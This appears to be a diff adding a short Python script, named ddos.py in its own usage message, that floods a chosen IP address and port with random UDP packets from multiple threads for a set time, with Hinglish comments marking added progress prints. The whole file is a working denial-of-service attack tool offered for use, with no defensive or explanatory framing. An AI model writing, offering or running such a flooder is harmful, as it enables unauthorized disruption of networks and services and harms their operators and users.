@@ -1,0 +1,44 @@
+import sys
+import socket
+import random
+import time
+import threading
+
+
+def flood(ip, port, duration):
+    timeout = time.time() + duration
+
+    while time.time() < timeout:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+            for i in range(2000):
+                s.sendto(random._urandom(1024), (ip, port))
+
+                # 👇 ye line add ki (output ke liye)
+                if i % 200 == 0:
+                    print(f"{threading.current_thread().name} → Sending packets...")
+
+        except:
+            pass
+        finally:
+            s.close()
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        print("Usage: python ddos.py <IP> <Port> <Duration> <Threads>")
+        sys.exit()
+
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    duration = int(sys.argv[3])
+    threads = int(sys.argv[4])
+
+    # 👇 ye line add ki (start message)
+    print(f"Starting on {ip}:{port} for {duration}s with {threads} threads")
+
+    for i in range(threads):
+        thread = threading.Thread(target=flood, args=(ip, port, duration), name=f"T{i+1}")
+        thread.start()
